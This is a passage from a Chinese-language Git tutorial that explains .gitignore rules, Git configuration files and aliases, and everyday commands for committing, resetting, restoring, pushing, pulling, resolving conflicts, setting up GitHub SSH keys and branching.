这种方式在不同的项目开发者之间是不共享的,是属于项目之上Git应用级别的行为
这种方式需要在任意位置创建相应的.gitignore文件,然后在使用git config --global core.excludesfile ~/.gitignore命令配置
在~/.gitconfig文件中会出现excludesfile = /home/username/.gitignore,说明Git把文件过滤规则应用到了Global的规则中。
但是这不保证其他的开发者在克隆代码后,他们那边的规则跟你的是一样的,这就带来了代码提交过程中的各种冲突问题。

【 .gitignore忽略规则的优先级 】
.gitingore文件中每一行指定一个忽略规则,Git检查忽略规则的时候有多个来源,它的优先级如下(由高到低):
1)从命令行中读取可用的忽略规则
2)当前目录定义的规则
3)父级目录定义的规则,依次递推
4)$GIT_DIR/info/exclude文件中定义的规则
5)core.excludesfile中定义的全局规则

【 忽略文件的原则 】
忽略操作系统自动生成的文件,比如缩略图等;
忽略编译生成的中间文件、可执行文件等,如一个文件是通过另一个文件自动生成的,那自动生成的文件就没必要放进版本库
忽略带有敏感信息的配置文件,比如存放口令的配置文件。

【 .gitignore忽略规则的匹配语法 - 可以使用反斜杠进行转义 】
git对于.ignore配置文件是按行从上到下进行规则匹配的,意味着如果前面的规则匹配的范围更大则后面的规则将不会生效;

1)以"＃"开头的行标识注释

2)空格不匹配任意文件,可作为分隔符

3)可以使用标准的glob模式匹配,即shell所使用的简化了的正则表达式。

4)以斜杠"/"开头表示目录;"/"结束的模式只匹配文件夹以及在该文件夹路径下的内容,但是不匹配该文件;"/"开始的模式匹配项目跟目录;如果一个模式不包含斜杠则它匹配相对于当前.gitignore文件路径的内容,如果该模式不在.gitignore文件中则相对于项目根目录
/mtk/           过滤根目录下的mtk整个文件夹
/bin            忽略根目录下的bin文件
/fd1/*          忽略根目录下的/fd1/目录的全部内容;
fd1/*           忽略目录fd1下的全部内容,不管是根目录下的/fd1/目录,还是某个子目录/child/fd1/目录都会被忽略;

/mtk/do.c       过滤mtk目录下的do.c文件
config.php      忽略当前目录及其子目录下的所有config.php文件

5)以星号"*"通配任意多个字符;使用两个星号"**"表示匹配任意中间目录
*.log           忽略所有.log结尾的文件
*.temp          过滤所有.temp文件
*.zip           过滤所有.zip文件
*/build/
/*.c            忽略根目录下.c后缀的文件
debug/*.obj     忽略debug/io.obj,不忽略debug/common/io.obj和tools/debug/io.obj
doc/*.txt       忽略doc/notes.txt但不包括doc/server/arch.txt

**/foo          忽略/foo,a/foo,a/b/foo等
a/**/z          匹配a/z,a/b/z或a/b/c/z等
**/node_modules/

6)以问号"?"通配任意单个字符

7)以方括号"[]"包含单个字符的匹配列表,即匹配任何一个列在方括号中的字符,比如[abc],[0-9],[a-z],*.s[a-w][a-z]

8)以叹号"!"开头取反表示不忽略(跟踪)匹配到的文件或目录,即要忽略指定模式以外的文件或目录
唯一的区别就是规则开头多了一个感叹号,Git会将满足这类规则的文件添加到版本管理中
但如果文件的父目录已经被前面的规则排除掉了,那么对这个文件用"!"规则是不起作用的,也就是说"!"开头的模式表示否定,该文件将会再次被包含,如果排除了该文件的父级目录则使用"!"也不会再次被包含,要先对的父目录使用!规则使其不被排除
!lib.a          表示lib.a除外
!/bin/run.sh    表示不忽略bin目录下的run.sh文件
!*.zip

</pre><textarea># Windows系统自动生成的垃圾文件:
Thumbs.db
ehthumbs.db
Desktop.ini
# Python 程序编译产生的文件目录:
*.py[cod]
*.so
*.egg
*.egg-info
dist
build
# My configurations自定义的配置文件:
db.ini
deploy_key_rsa

.DS_Store
node_modules/
dist/
npm-debug.log

</textarea>

<h4>git配置文件有三个</h4><pre>
1、/etc/gitconfig或C:\Users\lenovo\.gitconfig
适用于系统所有用户和所有项目,使用git config --system -l选项读写的就是这个文件

2、~/.gitconfig 全局配置或C:\Users\用户名\.gitconfig
只适用于当前登录用户的配置,使用git config --global -l选项读写的就是这个文件

3、位于git项目目录中的.git/config
适用于当前git项目的配置,使用git config -l选项读写的就是这个文件

对于同一配置项三个配置文件的优先级是1< 2< 3,每一个级别的配置都会覆盖上层的相同配置,所以.git/config里的配置会覆盖/etc/gitconfig中的同名变量

git config [--global | --system] node.name       // 查看配置
git config [--global | --system] node.name value // 修改配置

全局配置用户名密码:
git config --global user.name "leo"
git config --global user.email "leo@qq.com"

项目配置用户名密码
git config user.name "leo"
git config user.email "leo***cn"

$ git config --global --list                // 查看全局配置
$ git config --global user.name hoby        // 修改
$ git config --global core.ignorecase false // 关闭忽略大小写
$ git config --global alias.br branch       // 修改简写
$ git config --unset alias.co               // 删除配置项

【 配置别名 】
$ git config --global alias.st status   // st表示status
$ git config --global alias.co checkout
$ git config --global alias.ci commit
$ git config --global alias.br branch

命令git reset HEAD file可以把暂存区的修改撤销掉(unstage),重新放回工作区。既然是一个unstage操作,就可以配置一个unstage别名:
$ git config --global alias.unstage 'reset HEAD'

配置一个git last让其显示最后一次提交信息:
$ git config --global alias.last 'log -1'
这样用git last就能显示最近一次的提交:
$ git last

</pre><textarea>> cat .git/config
[core]
    repositoryformatversion = 0
    filemode = false
    bare = false
    logallrefupdates = true
    symlinks = false
    ignorecase = true
    autocrlf = true
    excludesfile = C:\\Users\\lixinglong\\Documents\\gitignore_global.txt
[remote "origin"]
    url = https://github.com/***/***.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master
[user]
    name = leo
    email = leo@***.cn
[credential]
    helper = store // 配置记住密码
[alias]
    last = log -1
    co = checkout
    ci = commit
    br = branch
    st = status

内存错误
Unlink of file '.git/objects/pack/pack-017c5a8e33c527caa3fda157d2900357de06253d.pack' failed. Should I try again?
Auto packing the repository in background for optimum performance.
报以上错误的解决方法:core新增配置项
[core]
    packedGitLimit = 128m
    packedGitWindowSize = 128m
[pack]
    deltaCacheSize = 128m
    packSizeLimit = 128m
    windowMemory = 128m

</textarea><pre>
【 推荐配置 】
git config --global user.email "mtide@xxx.com"
git config --global user.name=mtide
git config --global color.ui true                   # 让Git显示颜色让命令输出更醒目
git config --system core.ignorecase false           # 不忽略文件名大小写
git config --system core.autocrlf input             # 换行模式为input,即提交时转换为LF,检出时不转换,windows和linux
git config --system core.filemode false             # 不检查文件权限
git config --system core.safecrlf true              # 拒绝提交包含混合换行符的文件
git config --system core.editor vim                 # 设置默认编辑器
git config --system core.repositoryformatversion 0  # Internal variable identifying the repository format and layout version
git config --system core.bare false                  # 默认不创建裸仓库
git config --system core.logallrefupdates true       # log所有ref的更新
git config --system core.precomposeunicode true      # Mac专用选项,开启以便文件名兼容其他系统
git config --system push.default simple              # 只推送本地当前分支,且与上游分支名字一致
git config --system pull.rebase true                 # 强制开启rebase模式
git config credential.helper store                   # 记住密码
git config --system alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"

</pre>

<h4>git具体操作流程</h4><pre>
【 帮助文档 】
git --help
git help add
git add -h

【 配置 】
配置本机的用户名和Email地址
$ git config --global user.name "Your Name"
$ git config --global user.email "email@example.com"

【 创建一个版本库 】
git init命令把当前目录变成Git管理的仓库,当前目录下多了一个.git的目录,这个目录是Git来跟踪管理版本库的
$ git init                       # 在当前目录新建一个git仓库
$ git init [project-name]        # 新建一个目录将其初始化为git代码库

$ git clone [url]                # 下载一个项目和其整个代码历史
$ git clone [url] newname        # 指定文件夹名称
$ git clone -b branch-name [url] # 下载一个项目分支

【 查看状态 】
$ git status查看状态,显示有变更的文件
Untracked files:                还从来没有被添加过的文件,它的状态是Untracked
Changes not staged for commit:  已经修改但没有add和commit的文件
Changes to be committed:        已经add但是没有commit的文件
nothing to commit, working tree clean  commit之后工作区就是干净的

【 把文件添加到版本库 】
把文件往Git版本库里添加的时候是分两步执行的:
第一步、git add把文件添加进去,把文件修改添加到暂存区(Stage);
第二步、git commit提交更改,一次性把暂存区的所有内容提交到当前分支,-m后输入本次提交的说明

$ git add file1
$ git add [file1] [file2] # 添加指定的文件到暂存区
$ git add *.html
$ git add [dir]        # 添加指定的目录包括子目录到暂存区
$ git add .            # 添加当前目录的所有文件、目录到暂存区,提交新文件(new)和被修改(modified)文件,不包括被删除(deleted)文件
$ git add -A|--all     # 提交所有变化
$ git add -p|--patch   # 添加每个变化前都会要求确认,对于同一个文件的多处变化可以实现分次提交
$ git add -u|--update  # 提交被修改(modified)和被删除(deleted)文件,不包括新文件(new)
$ git add -f|--force   # 强制添加被.gitignore过滤的文件

git add -A  提交所有变化
git add -u  提交被修改(modified)和被删除(deleted)文件,不包括新文件(new)
 git add .  提交新文件(new)和被修改(modified)文件,不包括被删除(deleted)文件

$ git commit -m [message]            # 提交暂存区到仓库区
$ git commit [file1] [file2] -m [message]  # 提交暂存区的指定文件到仓库区
$ git commit -a                      # 提交工作区自上次commit之后的变化直接到仓库区
$ git commit -v                      # 提交时显示所有diff信息
$ git commit --amend -m [message]    # 使用新commit代替上一次提交,如果代码没有任何新变化则用来改写上次commit的提交信息
$ git commit --amend [file1] [file2] # 重做上一次commit并包括指定文件的新变化

$ git add .           添加当前目录下所有的文件、文件夹
$ git add filename    添加指定名称的文件
$ git commit -m "wrote a readme file"

commit可以一次提交很多文件,所以可以多次add不同的文件
$ git add file1.txt
$ git add file2.txt file3.txt
$ git commit -m "add 3 files."

【 历史或统计信息 】
$ git log                                 # 查看提交的历史记录,显示当前分支的版本历史,结果太多可用q退出
$ git log -5                              # 显示最后5次提交
$ git log --pretty=oneline                # 简洁信息列表
$ git log --stat                          # 显示commit历史及每次commit发生变更的文件
$ git log -S [keyword]                    # 根据关键词搜索提交历史
$ git log [tag] HEAD --pretty-format:%s   # 显示某个commit之后的所有变动,每个commit占据一行
$ git log [tag] HEAD --grep feature       # 显示某个commit之后的所有变动,其提交说明必须符合搜索条件
$ git log --follow [file]                 # 显示某个人间的版本历史包括文件名
$ git log whatchanged [file]              # 显示某个人间的版本历史包括文件名
$ git log -p [file]                       # 显示指定文件相关每次diff
$ git log -5 --pretty --oneline           # 显示过去5次提交
$ git shortlog -sn                        # 显示所有提交过的用户,按提交次数排序
$ git blame [file]                        # 显示本地文件是什么人什么时候修改过
$ git log --author="author"               # 查看某个人提交的日志

git log --pretty=oneline
一大串类似3628164...882e1e0的是commit id(版本号),是一个SHA1计算出来的一个非常大的数字,用十六进制表示
在Git中用HEAD表示当前版本,上一个版本是HEAD^,上上一个版本是HEAD^^,往上10个版本写成HEAD~100

$ git show --name-only [commitid]     # 显示某次提交发生变化的文件
$ git show [commitid]                 # 显示某次提交的元数据和内容变化
$ git show [commitid]:[filename]      # 显示某次提交时某个文件的内容

【 git diff 比对文件之间的差异 】
查询该文件和git仓库中对应文件的区别即做了什么修改,如果已经add就没有输出,这一步骤应该在add之前,即添加之前可以用来看看做了什么修改
git diff < localbranch> < remote>/< remotebranch>

比对暂存区和工作区
$ git diff                                # 比对暂存区和工作区全部文件的差异
$ git diff filename                       # 比对暂存区和工作区filename的差异

比对分支文件与工作区文件的差异,即比对commit提交中的文件与工作区文件差异,因为分支就是指向某个commit提交的
$ git diff f2303a6 readme.txt

比对暂存区与指定提交差异,默认是比对暂存区和最新提交的指定文件
$ git diff --cached [file]                # 显示暂存区和上一个commit的差异
$ git diff --cached f2303a6 readme.txt    # 比对指定提交与暂存区文件差异

$ git diff --stat master origin/master    # 显示本地和远程存在差异的文件名,不显示内容
$ git diff HEAD                           # 显示工作区和当前分支最新commit之间的差异
$ git diff [first-branch] [second-branch] # 显示两次提交自建的差异
$ git diff --shortstat "@{0 day ago}"     # 显示今天写了打多少行代码

【 撤销恢复 管理修改(包括删除文件) 】
Git比其他版本控制系统设计得优秀,因为Git跟踪并管理的是修改,而非文件

$ git checkout .                  # 恢复暂存区的所有文件到工作区,和git add .相反
$ git checkout [file]             # 恢复暂存区的指定文件到工作区
$ git checkout [commitid] [file]  # 恢复某个commit的指定文件到暂存区和工作区

git checkout -- readme.txt
把readme.txt文件在工作区的修改全部撤销,命令中没有--就变成了"切换到另一个分支",这里有两种情况:
一种是readme.txt自修改后还没有被放到暂存区,现在撤销修改就回到和版本库一模一样的状态;
一种是readme.txt已经添加到暂存区后,又作了修改,现在撤销修改就回到添加到暂存区后的状态。
总之就是让这个文件回到最近一次commit或add时的状态

git reset命令是Git提供的后悔药之一,它可以把内容恢复到指定的commit提交版本,可以重置当前分支所指向提交的位置,commit提交依然存在,只是当前分支所指向的commit提交进行了重置,分支所指向的新commit提交之后的提交就像消失了一样,git log无法查询到

usage:
git reset [--mixed | --soft | --hard | --merge | --keep] [-q] [< commit>]
git reset [-q] [< tree-ish>] [--] < paths>...
git reset --patch [< tree-ish>] [--] [< paths>...]

--mixed 是reset的默认参数,改变暂存区内容,但不会改变工作区
--soft 仅仅移动当前Head指针,不会改变工作区和暂存区的内容
--hard 当前head指针、工作区和暂存区内容全部改变

--mixed：默认值,移动head指针,当重置分支所指向commit提交位置时,暂存区中的内容会被新指向的commit提交内容所替换,工作区内容不变。
--soft：仅仅移动当前Head指针,暂存区和工作区的内容不变
--hard：移动当前Head指针,暂存区和工作区的内容都会被新指向的commit提交内容所替换,只影响被跟踪的文件,工作区有新增的文件并不会被影响。

假如commit已经被push到远程仓库上,那么其他开发人员可能会基于对应的commit提交进行开发产生新的commit,如果此时进行reset操作,会造成其他开发人员的提交历史丢失,这可能会产生严重后果

$ git reset 5609309 --hard        # 使用sha-1值作为参数
$ git reset HEAD^ --hard          # 使用HEAD作为参数
$ git reset master^ --hard        # 使用分支名称作为参数

$ git reset [file]                # 重置暂存区的指定文件,与上一次commit保持一致,但工作区不变
$ git reset [commitid]            # 重置当前分支的指针为指定commit,同时重置暂存区,但工作区不变
$ git reset --hard                # 重置暂存区与工作区,与上一次commit保持一致
$ git reset --hard [commitid]     # 重置当前分支的HEAD为指定commit,同时重置暂存区和工作区,与指定commit一致
$ git reset --keep [commitid]     # 重置当前HEAD为指定commit,但保持暂存区和工作区不变

git reset -mixed filename：此为默认方式,这种方式回退到某个版本,只保留工作区,回退commit和index信息
git reset -soft filename:回退到某个版本,只回退了commit的信息,不会恢复到index file一级,如果还要提交则直接commit即可
git reset -hard filename：彻底回退到某个版本,本地的源码也会变成为上一个版本的内容

git reset HEAD filename命令可以把暂存区的修改撤销掉(unstage),重新放回工作区
git reset命令既可以回退版本,也可以把暂存区的修改回退到工作区,用HEAD时表示最新的版本

$ git revert [commit]             # 新建一个commit用来撤销指定commit,后者的所有变化都将被前者抵消并yy到当前分支
$ git stash                       # 暂时将未提交的变化移除,稍后再移入
$ git stash pop                   # 暂时将未提交的变化移除,稍后再移入

【 回滚文件 -- 让单个文件回退到指定版本时命令最后添加文件名,否则就是回退整个仓库 】
进入到文件所在目录查看文件的修改记录
git log fileName

1. 修改完,还未执行add 
git checkout .
git checkout filename
使用暂存区的文件覆盖工作区,所以执行完git add .之后再执行该命令是无效的  

2.使用add提交到暂存区,还未commit之前
git reset  先用Head指针覆盖当前的暂存区内容
git checkout . 再用暂存区内容覆盖工作区内容
或者使用
git reset --hard 直接使用head覆盖当前暂存区和工作区

3.已经commit,还未push
git reset --hard origin/master
从远程仓库把代码取回来,然后覆盖本地仓库、本地暂存区和工作区  
或者使用
git reset --hard last_commit_id
覆盖本地仓库、暂存区和工作区,其中查看last_commit_id命令为git log
或者使用
git reset --mixed last_commit_id覆盖本地的暂存区,再执行
git checkout . 覆盖本地工作区

4.已经push,那就没办法了

实际经常使用的情况有两种
1. 修改错了,完全覆盖掉,使用
git reset --hard commit_id
2. 错误的把大文件添加到了缓存区,使用
git reset
撤回添加

【 版本回退 】
不断对文件进行修改,然后不断提交修改到版本库里,每当觉得文件修改到一定程度的时候就可以保存一个快照commit。一旦把文件改乱了或误删了文件,还可以从最近的一个commit恢复,然后继续工作

git reset命令执行版本回退
$ git reset --hard HEAD^

执行版本回退后git log命令无法查看回退之前的版本,可以执行git reset --hard加指定的commitid
Git的版本回退速度非常快,因为Git在内部有个指向当前版本的HEAD指针,回退版本时Git仅仅是把HEAD从指向append GPL

如果无法找到新版本的commitid时,Git提供了git reflog命令用来记录每一次命令
穿梭前,用git log可以查看提交历史,以便确定要回退到哪个版本。
要重返未来,用git reflog查看命令历史,以便确定要回到未来的哪个版本
第一列7个字符即为commit id的前7位,执行git reset --hard加这七个字符即可

$ git reflog
587f08c(HEAD -> master) HEAD@{0}: reset: moving to 587f08ce4c27a59a996ce99564355de40f451b7a
28e51bb HEAD@{1}: reset: moving to HEAD^
587f08c(HEAD -> master) HEAD@{2}: commit: append GPL
28e51bb HEAD@{3}: commit(initial): wrote a readme file

【 删除文件 】
在Git中删除也是一个修改操作
$ rm readme.txt
Git知道删除了文件,因此工作区和版本库就不一致了,git status命令会立刻告诉哪些文件被删除了
现在有两个选择,一是确实要从版本库中删除该文件,那就用命令git rm删掉,并且git commit
另一种情况是删错了,因为版本库里还有,所以可以很轻松地把误删的文件恢复到最新版本,git checkout是用版本库里的版本替换工作区的版本,无论工作区是修改还是删除都可一键还原
$ git checkout -- test.txt

通过linux命令删除一个文件需要三个步骤：
1、删除文件,然后查看状态
$ rm python/test.text
$ git status
Changes not staged for commit:
(use "git add/rm < file>..." to update what will be committed)
(use "git checkout -- < file>..." to discard changes in working directory)
deleted:    python/test.text(红色标识)
分析如下：
readme.txt文件的状态是被删除。
此时工作区中的文件已经被删除,
Changes not staged for commit表明删除文件和新增文件对Git来说都是一种改变,并没有将此改变提交到暂存区。如果要切实在commit提交中也要删除此文件,那么就要首先将此种改变add提交暂存区,然后commit提交
2、将此种改变提交暂存区,git add python/test.text
3、最后进行commit提交,git commit -m "delete python/test.text"

使用git rm命令可以节省一步
$ git rm vuejs/test.html
rm 'vuejs/test.html'
$ git status
Changes to be committed:
  (use "git reset HEAD < file>..." to unstage)
        deleted:    vuejs/test.html(绿色标识)
分析如下：
readme.txt处于deleted状态。
工作区中的文件已经被删除。
Changes to be committed表明此删除改变已经提交到暂存区,如果要切实在commit提交中也要删除此文件,就可以省略git add命令,直接commit提交即可。
$ git commit -m "delete vuejs/test.html"

$ git rm test.txt           # 删除工作区文件并将这次删除放入暂存区
$ git rm -r test            # 删除工作区文件夹并将这次删除放入暂存区
$ git rm [file1] [file2]    # 删除工作区文件并将这次删除放入暂存区

$ git rm --cached [file]
仅删除暂存区中对应的文件,但该文件会保留在工作区,如果仅想让文件脱离Git的跟踪可以后面加--cached
查看状态显示处于untracked未跟踪状态,也就是从暂存区删除,处于未跟踪状态只是没有存在于暂存区,历史提交记录中的记录依然存在

$ git mv [file-origin] [file-renamed]  # 文件改名,并将这个改名放入暂存区

【 恢复删除的文件 】
rm命令只是将工作区中的文件删除,暂存区相应的文件依然存在,只要将暂存区内容恢复到工作区即可。
$ git checkout readme.txt

git checkout命令的两种用法：
1、后面跟着分支名称,Git会切换到指定的分支。
2、后面跟着文档名或路径,G不会切换分支,而是把文件从.git目录里取一份恢复到目前的工作目录

恢复使用git rm删除的文件
被git rm命令删除,对应暂存区的文件已经不存在,那么只能从commit提交记录中恢复,恢复的方法有多种,这里同样使用git checkout命令来实现：
$ git checkout HEAD readme.txt # 将最后一次commit提交中的readme.txt文件恢复

任何情况都可以恢复吗：
当然不是,如果把.git目录删除了肯定是无法再恢复
实质上能将删除的文件恢复是因为在.git目录中有备份,Git会将暂存区或历史提交中内容来恢复。

【 远程同步 】
$ git remote                              # 查看远程库的信息
$ git remote -v                           # 显示所有远程仓库详细信息可抓取和推送的origin的地址,没有推送权限就看不到push的地址
$ git remote show [remote]                # 显示某个远程仓库的信息
$ git remote add [shortname] [url]        # 增加一个新的远程仓库并命名

$ git fetch [remote]                      # 下载远程仓库的所有变动
$ git pull [remote] [branch]              # 取回远程仓库的变化并与本地分支合并

$ git push [remote] [branch]              # 上传本地指定分支到远程仓库
$ git push [remote] --force               # 强制推送当前分支到远程仓库即使有冲突
$ git push [remote] --all                 # 推送所有分支到所有远程仓库

git push <远程主机名> <本地分支名> <远程分支名>
git push origin master:refs/for/master
将本地的master分支推送到远程主机origin上的对应master分支,origin是远程主机名,第一个master是本地分支名,第二个master是远程分支名

git push origin master
省略远程分支则表示将本地分支推送到与之存在追踪关系的远程分支(通常两者同名),如果该远程分支不存在则会被新建

git push origin :refs/for/master
省略本地分支名则表示删除指定的远程分支,因为这等同于推送一个空的本地分支到远程分支,等同于git push origin --delete master

git push origin
如果当前分支与远程分支存在追踪关系则本地分支和远程分支都可以省略,将当前分支推送到origin主机的对应分支

git push
如果当前分支只有一个远程分支,那么主机名都可以省略

git push -u origin master
如果当前分支与多个主机存在追踪关系,则可以使用-u参数指定一个默认主机,这样后面就可以不加任何参数使用git push
不带任何参数的git push,默认只推送当前分支,这叫做simple方式,还有一种matching方式会推送所有有对应的远程分支的本地分支,Git2.0之前默认使用matching,现在改为simple方式
更改设置:git config --global push.default matching OR git config --global push.default simple

git push --all origin
不管是否存在对应的远程分支,将本地的所有分支都推送到远程主机

git push --force origin
push时需要本地先git pull更新到跟服务器版本一致,如果本地版本库比远程服务器上的低一般会提示git pull更新,如果一定要提交可以使用这个命令。

git push origin --tags
push时不会推送分支,如果一定要推送标签的话那么可以使用这个命令

</pre><img src="image/git.jpg"><pre>
【 git fetch和git pull 】
git fetch是将远程主机的最新内容拉到本地,更新本地的远程分支,用户在检查了以后决定是否合并到工作本机分支中。
git pull是将远程主机的最新内容拉下来后直接合并,即git pull = git fetch + git merge,这样可能会产生冲突,需要手动解决。

分支是用来标记特定代码的提交,每一个分支通过SHA1sum值来标识,所以对分支的操作是轻量级的,改变的仅仅是SHA1sum值。

</pre><textarea>当前有2个分支,A,C,E属于master分支,而A,B,D,F属于dev分支。
A----C----E(master)
 \
  B---D---F(dev)

它们的head指针分别指向E和F,对上述做如下操作：
git checkout master  // 切换到master分支
git merge dev        // 将dev分支合并到当前分支(master)中

合并完成后：
A---C---E---G(master)
 \         /
  B---D---F(dev)

现在ABCDEFG属于master,G是一次合并后的结果,是将E和Ｆ的代码合并后的结果,可能会出现冲突。而ABDF依然属于dev分支。可以继续在dev的分支上进行开发:
A---C---E---G---H(master)
 \         /
  B---D---F---I(dev)

</textarea><pre>
git fetch <远程主机名>
将某个远程主机的更新全部取回本地

最常见的命令如取回origin主机的master分支：
$ git fetch origin master

取回更新后,会返回一个FETCH_HEAD,指的是某个branch在服务器上的最新状态,可以在本地通过它查看刚取回的更新信息：
$ git log -p FETCH_HEAD
返回的信息包括更新的文件名、作者和时间,以及更新的代码,红色[删除]和绿色[新增]部分,可以通过这些信息来判断是否产生冲突,以确定是否将更新merge到当前分支。

git pull的过程可以理解为：
git fetch origin master //从远程主机的master分支拉取最新内容
git merge FETCH_HEAD    //将拉取下来的最新内容合并到当前所在的分支中
即将远程主机的某个分支的更新取回,并与本地指定的分支合并,完整格式可表示为：
$ git pull <远程主机名> <远程分支名>:<本地分支名>
如果远程分支是与当前分支合并,则冒号后面的部分可以省略：
$ git pull origin next

【 git pull 冲突解决 】
git比较本地仓库和远程仓库的差异
1.更新本地的远程分支
git fetch origin
2.本地与远程的差集 :(显示远程有而本地没有的commit信息)
git log master origin/master
3.统计文件的改动
git diff --stat master origin/master

在公司团队中写完代码就要提交到git上面,因为多人合作,先要将远端的代码pull更新到本地。往往这时候因为大家对同一个文件同一个地方做了操作,导致pull代码冲突发生,工程崩溃。提示错误信息如下：
error: Your local changes to 'c/environ.c' would be overwritten by merge.  Aborting.
Please, commit your changes or stash them before you can merge.

这个提示意思就是说更新下来的内容和本地修改的内容有冲突,先提交改变的内容或先将本地修改的内容暂时存起来。
下面分几步解决处理这个pull冲突问题.

1.存储本地修改的内容
git stash  # 将本地修改的代码做一份备份存储起来,可以用git stash list查看刚刚备份保存的内容,其中stash@{0}就是刚刚备份存储的标记

2.pull内容
将本地代码做了备份保存后,就可以pull远端代码
git pull

3.还原备份暂存的代码
git stash pop stash@{0}
这时候系统会提示类似以下的信息：
Auto-merging c/environ.c
CONFLICT (content): Merge conflict in c/environ.c
这个提示内容意思就是系统自动合并修改的内容,但当中会有冲突,需要解决其中的冲突。

4.解决文件中的冲突内容
打开上面提示的冲突文件,会看到类似的内容
<<<<<<<<<<
==========
>>>>>>>>>>
其中Updated upstream和=======之间的内容是从远端pull下来的代码,=======和Stashed changes之间的内容则是本地修改的内容。这时候需要修改决定留下哪些需要的内容。
最后解决完冲突就可以正常git提交了。

【 远程仓库 github 】
Git是分布式版本控制系统,同一个Git仓库可以分布到不同的机器上
只有一台机器有一个原始版本库,此后别的机器可以克隆这个原始版本库,而且每台机器的版本库其实都是一样的,并没有主次之分;一台电脑上只要不在同一个目录下也是可以克隆多个版本库的,但没有意义

实际情况往往是找一台电脑充当服务器的角色,每天24小时开机,其他每个人都从这个服务器仓库克隆一份到自己的电脑上,并且各自把各自的提交推送到服务器仓库里,也从服务器仓库中拉取别人的提交。
完全可以自己搭建一台运行Git的服务器;GitHub网站就是提供Git仓库托管服务的,只要注册一个GitHub账号就可免费获得Git远程仓库

由于本地Git仓库和GitHub仓库之间的传输是通过SSH加密的,所以需要设置SSH Key
因为GitHub需要识别出推送的提交确实是用户推送的,而不是别人冒充的,而Git支持SSH协议,所以GitHub只要知道了公钥就可以确认只有自己才能推送。
当然GitHub允许添加多个Key。假定有若干电脑,一会儿在公司提交,一会儿在家里提交,只要把每台电脑的Key都添加到GitHub就可以在每台电脑上往GitHub推送了

第1步:创建SSH Key
在用户主目录下看有没有.ssh目录,如果有再看这个目录下有没有id_rsa和id_rsa.pub这两个文件,如果已经有了可直接跳到下一步,如果没有打开Shell创建SSH Key:
$ ssh-keygen -t rsa -C "youremail@example.com"
然后一路回车使用默认值即可,由于这个Key也不是用于军事目的,所以也无需设置密码。
如果一切顺利的话,可以在用户主目录里找到.ssh目录,里面有id_rsa和id_rsa.pub两个文件,这两个就是SSH Key的秘钥对,id_rsa是私钥不能泄露出去,id_rsa.pub是公钥可以放心地告诉任何人。

第2步:登陆GitHub,打开"Account settings","SSH Keys"页面:
然后点"Add SSH Key",填上任意Title,在Key文本框里粘贴id_rsa.pub文件的内容,点"Add Key"就已经添加的Key

在GitHub上免费托管的Git仓库,任何人都可以看到,但只有自己才能改,所以不要把敏感信息放进去
如果不想让别人看到Git库有两个办法,一个是交点保护费让GitHub把公开的仓库变成私有的,这样别人就不可读更不可写。另一个办法是自己动手搭一个Git服务器,因为是自己的Git服务器,所以别人也是看不见的

关联本地和远程仓库
$ git remote add origin https://github.com/berlin75/learngit.git

$ git push -u origin master
git push命令实际上是把当前分支master推送到远程
-u参数,Git不但会把本地的master分支内容推送的远程新的master分支,还会把本地的master分支和远程的master分支关联起来,以后的推送或拉取时就可以简化命令
$ git push origin master
把本地master分支的最新修改推送至GitHub,现在就拥有了真正的分布式版本库

分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在,也就是有没有联网都可以正常工作,当有网络的时候再把本地提交推送一下就完成了同步,而SVN在没有联网的时候是拒绝干活的

【 git clone 】
最好的方式是先创建远程库,然后用git clone命令从远程库克隆一个本地库
$ git clone <版本库的网址>
$ git clone https://github.com/berlin75/gitkills.git
$ git clone http://github.com/jquery/jquery.git
该命令会在本地主机生成一个目录,与远程主机的版本库同名。如果要指定不同的目录名,可以将目录名作为git clone命令的第二个参数。
$ git clone <版本库的网址> <本地目录名>

git clone支持多种协议,除HTTP(s)以外还支持SSH、Git、本地文件协议等
$ git clone http[s]://example.com/path/to/repo.git
$ git clone http://git.oschina.net/yiibai/sample.git
$ git clone ssh://example.com/path/to/repo.git
$ git clone git://example.com/path/to/repo.git
$ git clone /opt/git/project.git
$ git clone file:///opt/git/project.git
$ git clone ftp[s]://example.com/path/to/repo.git
$ git clone rsync://example.com/path/to/repo.git

Git支持多种协议,默认git://使用ssh,也可以使用https等其他协议
使用https速度慢,每次推送都必须输入口令,但在某些只开放http端口的公司内部就无法使用ssh协议而只能用https
git@github.com:berlin75/gitkills.git
https://github.com/berlin75/gitkills.git

【 分支管理gh-pages 】
$ git branch                                          # 列出所有本地分支,* master
$ git branch -r                                       # 列出所有远程分支,remotes/origin/master
$ git branch -a                                       # 列出所有本地和远程分支
$ git branch [branch-name]                            # 新建分支但依然停留在当前分支
$ git branch [branch] [commit]                        # 新建分支指向指定commit
$ git branch --track [branch] [remote-branch]         # 新建分支与指定远程分支建立追踪关系
$ git branch --set-upstream [branch] [remote-branch]  # 建立追踪关系,在现有分支和指定远程分支之间
$ git branch -d [branch-name]                         # 删除分支
$ git branch -dr [remote/branch]                      # 删除远程分支
$ git push origin --delete [branch-name]              # 删除远程分支

$ git checkout -b [branch]                            # 新建分支并切换到该分支,相对于git branch dev && git checkout dev
$ git checkout [branch-name]                          # 切换到指定分支并跟新工作区
$ git checkout -                                      # 切换到上一个分支

$ git merge [branch]                                  # 合并指定分支到当前分支
$ git cherry-pick [commit]                            # 选择一个commit合并进当前分支

每次提交Git都把它们串成一条时间线,这条时间线就是一个分支。如果只有一条时间线,在Git里这个分支叫主分支即master分支。HEAD严格来说不是指向提交,而是指向master,master才是指向提交的,所以HEAD指向的就是当前分支
每次提交master分支都会向前移动一步,这样随着不断提交,master分支的线也越来越长

创建新的分支如dev时Git新建了一个指针叫dev,指向master相同的提交,再把HEAD指向dev,就表示当前分支在dev上
Git创建一个分支很快,因为除了增加一个dev指针,改变HEAD的指向,工作区的文件都没有任何变化
不过从现在开始对工作区的修改和提交就是针对dev分支了,比如新提交一次后dev指针往前移动一步,而master指针不变

假如在dev上的工作完成了就可以把dev合并到master上,直接把master指向dev的当前提交就完成了合并
所以Git合并分支也很快,就改改指针,工作区内容也不变
合并完分支后,甚至可以删除dev分支,删除dev分支就是把dev指针给删掉,删掉后就剩下了一条master分支

修改文件,执行git add commit命令后,切换回master分支:
$ git checkout master
查看文件,刚才添加的内容不见了,因为那个提交是在dev分支上,而master分支此刻的提交点并没有变

git merge命令用于合并指定分支到当前分支
